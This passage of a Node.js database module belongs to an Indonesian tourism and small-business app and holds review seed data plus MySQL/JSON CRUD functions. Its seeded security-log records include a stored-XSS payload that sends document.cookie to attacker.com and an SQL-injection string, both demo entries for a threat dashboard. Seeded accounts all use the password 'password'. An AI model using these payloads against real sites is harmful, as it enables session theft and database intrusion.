                "userName": "Warkop_Lover_11",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-14T14:36:35.407Z"
            },
            {
                "id": "r890",
                "merchantId": "m297",
                "userName": "Sejarah_RI_40",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-15T14:36:35.407Z"
            },
            {
                "id": "r891",
                "merchantId": "m297",
                "userName": "Keluarga_Ceria_91",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-17T14:36:35.407Z"
            },
            {
                "id": "r892",
                "merchantId": "m298",
                "userName": "Neng_Siti_54",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-22T14:36:35.407Z"
            },
            {
                "id": "r893",
                "merchantId": "m298",
                "userName": "Warkop_Lover_50",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-19T14:36:35.407Z"
            },
            {
                "id": "r894",
                "merchantId": "m298",
                "userName": "Sejarah_RI_62",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r895",
                "merchantId": "m299",
                "userName": "Warkop_Lover_40",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r896",
                "merchantId": "m299",
                "userName": "Sejarah_RI_15",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-24T14:36:35.407Z"
            },
            {
                "id": "r897",
                "merchantId": "m299",
                "userName": "Keluarga_Ceria_43",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-19T14:36:35.407Z"
            },
            {
                "id": "r898",
                "merchantId": "m300",
                "userName": "Warkop_Lover_89",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-28T14:36:35.407Z"
            },
            {
                "id": "r899",
                "merchantId": "m300",
                "userName": "Sejarah_RI_61",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-17T14:36:35.407Z"
            },
            {
                "id": "r900",
                "merchantId": "m300",
                "userName": "Keluarga_Ceria_33",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-24T14:36:35.407Z"
            }
        ],
    threats: [
        { id: "t1", ip: "103.45.12.89", timestamp: "2026-05-25T14:22:10Z", type: "Stored XSS", payload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", severity: "HIGH", action: "BLOCKED" },
        { id: "t2", ip: "182.253.90.11", timestamp: "2026-05-25T16:45:33Z", type: "SQL Injection", payload: "' OR '1'='1' --", severity: "HIGH", action: "BLOCKED" },
        { id: "t3", ip: "114.79.2.45", timestamp: "2026-05-26T02:11:05Z", type: "Cyberbullying / Profanity", payload: "Warung bangsat pelayanan kayak tahi babi!", severity: "MEDIUM", action: "BLOCKED" }
    ],
    users: [
        { username: "wisatawan", password: bcrypt.hashSync("password", 10), role: "wisatawan", fullname: "Budi Wisatawan" },
        { username: "umkm", password: bcrypt.hashSync("password", 10), role: "umkm", fullname: "Haji Azza (Pemilik UMKM)" },
        { username: "itsec", password: bcrypt.hashSync("password", 10), role: "itsec", fullname: "Satria IT Cybersec" },
        { username: "admin", password: bcrypt.hashSync("password", 10), role: "superadmin", fullname: "Dinas Pariwisata Gresik" }
    ],
    cache: {}
};

// -------------------------------------------------------------
// DUAL-MODE DATABASE CONFIGURATION (MySQL + JSON Fallback)
// -------------------------------------------------------------
let mysqlPool = null;
let useMySQL = false;

async function connectMySQL() {
    const dbHost = process.env.DB_HOST;
    const dbUser = process.env.DB_USER;
    const dbPassword = process.env.DB_PASSWORD;
    const dbName = process.env.DB_NAME;

    if (!dbHost || !dbUser || !dbName) {
        console.warn("[Database] MySQL credentials missing in .env. Falling back to persistent JSON-file DB mode.");
        return false;
    }

    try {
        const mysql = require('mysql2/promise');
        
        // 1. Connect to MySQL server first (without database selected) to create the DB if missing
        console.log(`[Database] Connecting to MySQL server at ${dbHost} to verify/create database...`);
        const tempConn = await mysql.createConnection({
            host: dbHost,
            user: dbUser,
            password: dbPassword
        });

        // 2. Automatically create database if not exists
        await tempConn.query(`CREATE DATABASE IF NOT EXISTS \`${dbName}\``);
        await tempConn.end();
        console.log(`[Database] Database '${dbName}' verified/created successfully!`);

        // 3. Connect the pool to the database
        mysqlPool = mysql.createPool({
            host: dbHost,
            user: dbUser,
            password: dbPassword,
            database: dbName,
            waitForConnections: true,
            connectionLimit: 10,
            queueLimit: 0
        });

        // Test connection
        const conn = await mysqlPool.getConnection();
        conn.release();
        
        console.log(`[Database] Successfully connected to MySQL Pool at ${dbHost} for '${dbName}'!`);
        useMySQL = true;
        await bootstrapMySQLSchema();
        return true;
    } catch (e) {
        console.error(`[Database Error] MySQL failed to connect or create database: ${e.message}. Falling back to persistent JSON DB.`);
        mysqlPool = null;
        useMySQL = false;
        return false;
    }
}

async function bootstrapMySQLSchema() {
    if (!useMySQL || !mysqlPool) return;
    try {
        console.log("[Database] Bootstrapping MySQL schemas...");
        
        // 1. Merchants Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS merchants (
                id VARCHAR(50) PRIMARY KEY,
                name VARCHAR(255) NOT NULL,
                owner VARCHAR(255) NOT NULL,
                type VARCHAR(50) NOT NULL,
                image VARCHAR(512),
                description TEXT,
                coords_lat DOUBLE NOT NULL,
                coords_lng DOUBLE NOT NULL,
                rating FLOAT DEFAULT 5.0,
                reviewsCount INT DEFAULT 0,
                catalog TEXT
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 2. Reviews Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS reviews (
                id VARCHAR(50) PRIMARY KEY,
                merchantId VARCHAR(50) NOT NULL,
                userName VARCHAR(255) NOT NULL,
                rating INT NOT NULL,
                text TEXT,
                timestamp VARCHAR(100) NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 3. Threats Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS threats (
                id VARCHAR(50) PRIMARY KEY,
                ip VARCHAR(100) NOT NULL,
                timestamp VARCHAR(100) NOT NULL,
                type VARCHAR(100) NOT NULL,
                payload TEXT,
                severity VARCHAR(50) NOT NULL,
                action VARCHAR(50) DEFAULT 'BLOCKED'
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 4. Cache Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS itinerary_cache (
                hash_key VARCHAR(64) PRIMARY KEY,
                expiry VARCHAR(100) NOT NULL,
                value LONGTEXT NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 5. Users Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS users (
                username VARCHAR(50) PRIMARY KEY,
                password VARCHAR(255) NOT NULL,
                role VARCHAR(50) NOT NULL,
                fullname VARCHAR(255) NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // Check if merchants table is empty to populate mock
        const [rows] = await mysqlPool.query("SELECT COUNT(*) as count FROM merchants");
        if (rows[0].count === 0) {
            console.log("[Database] Seeding initial mock data into MySQL tables...");
            
            // Seed Merchants
            for (const m of initialData.merchants) {
                await mysqlPool.query(
                    "INSERT INTO merchants (id, name, owner, type, image, description, coords_lat, coords_lng, rating, reviewsCount, catalog) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    [m.id, m.name, m.owner, m.type, m.image || '', m.description, m.coords[0], m.coords[1], m.rating, m.reviewsCount, JSON.stringify(m.catalog)]
                );
            }

            // Seed Reviews
            for (const r of initialData.reviews) {
                await mysqlPool.query(
                    "INSERT INTO reviews (id, merchantId, userName, rating, text, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                    [r.id, r.merchantId, r.userName, r.rating, r.text, r.timestamp]
                );
            }

            // Seed Threats
            for (const t of initialData.threats) {
                await mysqlPool.query(
                    "INSERT INTO threats (id, ip, timestamp, type, payload, severity, action) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    [t.id, t.ip, t.timestamp, t.type, t.payload, t.severity, t.action]
                );
            }

            console.log("[Database] Merchants, reviews, threats seeded.");
        }

        // Always ensure default users exist (independent of merchants seed state)
        const [userRows] = await mysqlPool.query("SELECT COUNT(*) as count FROM users");
        if (userRows[0].count === 0) {
            console.log("[Database] Seeding default user accounts...");
            for (const u of initialData.users) {
                await mysqlPool.query(
                    "INSERT IGNORE INTO users (username, password, role, fullname) VALUES (?, ?, ?, ?)",
                    [u.username, u.password, u.role, u.fullname]
                );
            }
            console.log("[Database] Default user accounts seeded.");
        }
    } catch (err) {
        console.error("[Database Error] Bootstrapping failed:", err.message);
    }
}

// -------------------------------------------------------------
// JSON FILE DATABASE CONSOLE ENGINE (FALLBACK)
// -------------------------------------------------------------
function loadJsonDb() {
    if (!fs.existsSync(DB_PATH)) {
        saveJsonDb(initialData);
        return initialData;
    }
    try {
        const raw = fs.readFileSync(DB_PATH, 'utf8');
        return JSON.parse(raw);
    } catch (e) {
        console.error("Failed to read JSON DB, using initial data:", e);
        return initialData;
    }
}

function saveJsonDb(data) {
    try {
        const tempPath = DB_PATH + '.tmp';
        fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf8');
        fs.renameSync(tempPath, DB_PATH);
        return true;
    } catch (e) {
        console.error("JSON atomic write failed, writing directly:", e);
        try {
            fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), 'utf8');
            return true;
        } catch (err) {
            return false;
        }
    }
}

// Initialize Dual Connection
connectMySQL();

// -------------------------------------------------------------
// UNIFIED PUBLIC DATABASE INTERFACE
// -------------------------------------------------------------
const db = {
    // 1. Get Merchants
    getMerchants: async () => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM merchants");
                return rows.map(r => ({
                    id: r.id,
                    name: r.name,
                    owner: r.owner,
                    type: r.type,
                    image: r.image || '',
                    description: r.description,
                    coords: [r.coords_lat, r.coords_lng],
                    rating: r.rating,
                    reviewsCount: r.reviewsCount,
                    catalog: JSON.parse(r.catalog || '[]')
                }));
            } catch (e) {
                console.error("MySQL query failed, falling back to JSON:", e);
            }
        }
        
        // JSON Fallback
        const data = loadJsonDb();
        return data.merchants;
    },

    // 2. Get Merchant By Id
    getMerchantById: async (id) => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM merchants WHERE id = ?", [id]);
                if (rows.length > 0) {
                    const r = rows[0];
                    return {
                        id: r.id,
                        name: r.name,
                        owner: r.owner,
                        type: r.type,
                        image: r.image || '',
                        description: r.description,
                        coords: [r.coords_lat, r.coords_lng],
                        rating: r.rating,
                        reviewsCount: r.reviewsCount,
                        catalog: JSON.parse(r.catalog || '[]')
                    };
                }
                return null;
            } catch (e) {
                console.error("MySQL query failed:", e);
            }
        }

        const data = loadJsonDb();
        return data.merchants.find(m => m.id === id);
    },

    // 3. Add Merchant
    addMerchant: async (merchant) => {
        const id = 'm_' + Date.now();
        const catalog = merchant.catalog || [];
        const rating = 5.0;
        const reviewsCount = 0;

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO merchants (id, name, owner, type, image, description, coords_lat, coords_lng, rating, reviewsCount, catalog) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    [id, merchant.name, merchant.owner, merchant.type, merchant.image || '', merchant.description, merchant.coords[0], merchant.coords[1], rating, reviewsCount, JSON.stringify(catalog)]
                );
                return { id, rating, reviewsCount, catalog, ...merchant };
            } catch (e) {
                console.error("MySQL insert failed:", e);
            }
        }

        const data = loadJsonDb();
        const newMerchant = { id, rating, reviewsCount, catalog, ...merchant };
        data.merchants.push(newMerchant);
        saveJsonDb(data);
        return newMerchant;
    },

    // 4. Update Catalog
    updateMerchantCatalog: async (merchantId, catalog) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("UPDATE merchants SET catalog = ? WHERE id = ?", [JSON.stringify(catalog), merchantId]);
                return await db.getMerchantById(merchantId);
            } catch (e) {
                console.error("MySQL update failed:", e);
            }
        }

        const data = loadJsonDb();
        const index = data.merchants.findIndex(m => m.id === merchantId);
        if (index !== -1) {
            data.merchants[index].catalog = catalog;
            saveJsonDb(data);
            return data.merchants[index];
        }
        return null;
    },

    // 4.5 Update Merchant Details (Super Admin edit/toggle)
    updateMerchant: async (merchantId, updated) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "UPDATE merchants SET name = ?, owner = ?, type = ?, image = ?, description = ?, coords_lat = ?, coords_lng = ?, status = ? WHERE id = ?",
                    [updated.name, updated.owner, updated.type, updated.image || '', updated.description, parseFloat(updated.coords[0]), parseFloat(updated.coords[1]), updated.status || 'aktif', merchantId]
                );
                return await db.getMerchantById(merchantId);
            } catch (e) {
                console.warn("MySQL update merchant failed (potentially missing status column), falling back without status column:", e);
                try {
                    await mysqlPool.query(
                        "UPDATE merchants SET name = ?, owner = ?, type = ?, image = ?, description = ?, coords_lat = ?, coords_lng = ? WHERE id = ?",
                        [updated.name, updated.owner, updated.type, updated.image || '', updated.description, parseFloat(updated.coords[0]), parseFloat(updated.coords[1]), merchantId]
                    );
                    return await db.getMerchantById(merchantId);
                } catch (err2) {
                    console.error("MySQL backup merchant update failed:", err2);
                }
            }
        }

        const data = loadJsonDb();
        const index = data.merchants.findIndex(m => m.id === merchantId);
        if (index !== -1) {
            data.merchants[index] = {
                ...data.merchants[index],
                ...updated,
                coords: [parseFloat(updated.coords[0]), parseFloat(updated.coords[1])]
            };
            saveJsonDb(data);
            return data.merchants[index];
        }
        return null;
    },

    // 5. Get Reviews
    getReviews: async (merchantId = null) => {
        if (useMySQL && mysqlPool) {
            try {
                let query = "SELECT * FROM reviews ORDER BY timestamp DESC";
                let params = [];
                if (merchantId) {
                    query = "SELECT * FROM reviews WHERE merchantId = ? ORDER BY timestamp DESC";
                    params = [merchantId];
                }
                const [rows] = await mysqlPool.query(query, params);
                return rows;
            } catch (e) {
                console.error("MySQL query failed:", e);
            }
        }

        const data = loadJsonDb();
        if (merchantId) {
            return data.reviews.filter(r => r.merchantId === merchantId);
        }
        return data.reviews;
    },

    // 6. Add Review
    addReview: async (review) => {
        const id = 'r_' + Date.now();
        const timestamp = new Date().toISOString();

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO reviews (id, merchantId, userName, rating, text, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                    [id, review.merchantId, review.userName, review.rating, review.text, timestamp]
                );

                // Re-calculate average rating for merchant
                const [reviewsRows] = await mysqlPool.query("SELECT rating FROM reviews WHERE merchantId = ?", [review.merchantId]);
                const count = reviewsRows.length;
                const sum = reviewsRows.reduce((acc, curr) => acc + curr.rating, 0);
                const avgRating = parseFloat((sum / count).toFixed(1));

                await mysqlPool.query(
                    "UPDATE merchants SET rating = ?, reviewsCount = ? WHERE id = ?",
                    [avgRating, count, review.merchantId]
                );

                return { id, timestamp, ...review };
            } catch (e) {
                console.error("MySQL review insertion failed:", e);
            }
        }

        const data = loadJsonDb();
        const newReview = { id, timestamp, ...review };
        data.reviews.unshift(newReview);

        // Update merchant average
        const merchant = data.merchants.find(m => m.id === review.merchantId);
        if (merchant) {
            const mReviews = data.reviews.filter(r => r.merchantId === review.merchantId);
            merchant.reviewsCount = mReviews.length;
            const sum = mReviews.reduce((acc, curr) => acc + curr.rating, 0);
            merchant.rating = parseFloat((sum / mReviews.length).toFixed(1));
        }

        saveJsonDb(data);
        return newReview;
    },

    // 7. Get Cybersecurity threats siber logs
    getThreats: async () => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM threats ORDER BY timestamp DESC");
                return rows;
            } catch (e) {
                console.error("MySQL threats select failed:", e);
            }
        }

        const data = loadJsonDb();
        return data.threats;
    },

    // 8. Add siber threat log
    addThreat: async (threat) => {
        const id = 't_' + Date.now();
        const timestamp = new Date().toISOString();
        const action = 'BLOCKED';

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO threats (id, ip, timestamp, type, payload, severity, action) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    [id, threat.ip, timestamp, threat.type, threat.payload, threat.severity, action]
                );
                return { id, timestamp, action, ...threat };
            } catch (e) {
                console.error("MySQL threat insert failed:", e);
            }
        }

        const data = loadJsonDb();
        const newThreat = { id, timestamp, action, ...threat };
        data.threats.unshift(newThreat);
        saveJsonDb(data);
        return newThreat;
    },

    // 9. Get Itinerary Cache (Smart cache)
    getItineraryCache: async (params) => {
        const key = crypto.createHash('sha256').update(JSON.stringify(params)).digest('hex');
        
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM itinerary_cache WHERE hash_key = ?", [key]);
                if (rows.length > 0) {
                    const cached = rows[0];
                    if (new Date(cached.expiry) > new Date()) {
                        console.log(`[Cache Hit - MySQL] Serving cached itinerary for key: ${key}`);
                        return JSON.parse(cached.value);
                    } else {
                        console.log(`[Cache Expired - MySQL] Evicting key: ${key}`);
                        await mysqlPool.query("DELETE FROM itinerary_cache WHERE hash_key = ?", [key]);
                    }
                }
                return null;
            } catch (e) {
                console.error("MySQL cache select failed:", e);
            }
        }

        const data = loadJsonDb();
        const cached = data.cache[key];
        if (cached) {
            if (new Date(cached.expiry) > new Date()) {
                console.log(`[Cache Hit - JSON] Serving cached itinerary for key: ${key}`);
                return cached.value;
            } else {
                console.log(`[Cache Expired - JSON] Evicting key: ${key}`);
                delete data.cache[key];
                saveJsonDb(data);
            }
        }
        return null;
    },

    // 10. Set Itinerary Cache
    setItineraryCache: async (params, value, ttlHours = 24) => {
        const key = crypto.createHash('sha256').update(JSON.stringify(params)).digest('hex');
        const expiry = new Date();
        expiry.setHours(expiry.getHours() + ttlHours);
        const expiryStr = expiry.toISOString();

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO itinerary_cache (hash_key, expiry, value) VALUES (?, ?, ?) ON DUPLICATE KEY UPDATE expiry = ?, value = ?",
                    [key, expiryStr, JSON.stringify(value), expiryStr, JSON.stringify(value)]
                );
                console.log(`[Cache Miss - MySQL] Caching itinerary under key: ${key} (Expires: ${expiryStr})`);
                return true;
            } catch (e) {
                console.error("MySQL cache insert failed:", e);
            }
        }

        const data = loadJsonDb();
        data.cache[key] = {
            expiry: expiryStr,
            value: value
        };
        saveJsonDb(data);
        console.log(`[Cache Miss - JSON] Caching itinerary under key: ${key} (Expires: ${expiryStr})`);
        return true;
    },

    // User Authentication Helpers
    getUser: async (username) => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM users WHERE username = ?", [username]);
                if (rows.length > 0) return rows[0];
                return null;
            } catch (e) {
                console.error("MySQL getUser failed:", e);
            }
        }

        const data = loadJsonDb();
        if (!data.users) data.users = [];
        return data.users.find(u => u.username === username) || null;
    },

    addUser: async (user) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO users (username, password, role, fullname) VALUES (?, ?, ?, ?)",
                    [user.username, user.password, user.role, user.fullname]
                );
                return user;
            } catch (e) {
                console.error("MySQL addUser failed:", e);
            }
        }

        const data = loadJsonDb();
        if (!data.users) data.users = [];
        data.users.push(user);
        saveJsonDb(data);
        return user;
    },

    updateUserPassword: async (username, hashedPassword) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("UPDATE users SET password = ? WHERE username = ?", [hashedPassword, username]);
                return true;
            } catch (e) {
                console.error("MySQL updateUserPassword failed:", e);
            }
        }

        const data = loadJsonDb();
        if (!data.users) data.users = [];
        const index = data.users.findIndex(u => u.username === username);
        if (index !== -1) {
            data.users[index].password = hashedPassword;
            saveJsonDb(data);
            return true;
        }
        return false;
    },

    // New CRUD & Admin additions
    getUsers: async () => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM users");
                return rows;
            } catch (e) {
                console.error("MySQL getUsers failed:", e);
            }
        }
        const data = loadJsonDb();
        return data.users || [];
    },

    saveUsers: async (users) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM users");
                for (const u of users) {
                    await mysqlPool.query(
                        "INSERT INTO users (username, password, role, fullname) VALUES (?, ?, ?, ?)",
                        [u.username, u.password, u.role, u.fullname]
                    );
                }
                return true;
            } catch (e) {
                console.error("MySQL saveUsers failed:", e);
            }
        }
        const data = loadJsonDb();
        data.users = users;
        saveJsonDb(data);
        return true;
    },

    saveReviews: async (reviews) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM reviews");
                for (const r of reviews) {
                    await mysqlPool.query(
                        "INSERT INTO reviews (id, merchantId, userName, rating, text, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                        [r.id, r.merchantId, r.userName, r.rating, r.text, r.timestamp]
                    );
                }
                return true;
            } catch (e) {
                console.error("MySQL saveReviews failed:", e);
            }
        }
        const data = loadJsonDb();
        data.reviews = reviews;
        saveJsonDb(data);
        return true;
    },

    saveThreats: async (threats) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM threats");
                for (const t of threats) {
                    await mysqlPool.query(
                        "INSERT INTO threats (id, ip, timestamp, type, payload, severity, action) VALUES (?, ?, ?, ?, ?, ?, ?)",
                        [t.id, t.ip, t.timestamp, t.type, t.payload, t.severity, t.action || 'BLOCKED']
                    );
                }
                return true;
            } catch (e) {
                console.error("MySQL saveThreats failed:", e);
            }
        }
        const data = loadJsonDb();
        data.threats = threats;
        saveJsonDb(data);
        return true;
    },

    deleteMerchant: async (merchantId) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM merchants WHERE id = ?", [merchantId]);
                await mysqlPool.query("DELETE FROM reviews WHERE merchantId = ?", [merchantId]);
                return true;
            } catch (e) {
                console.error("MySQL deleteMerchant failed:", e);
            }
        }
        const data = loadJsonDb();
        data.merchants = data.merchants.filter(m => m.id !== merchantId);
        data.reviews = data.reviews.filter(r => r.merchantId !== merchantId);
        saveJsonDb(data);
        return true;
    },

    // Encryption Helpers
    encryptField: (text) => encrypt(text),
    decryptField: (ciphertext) => decrypt(ciphertext)
};

module.exports = db;
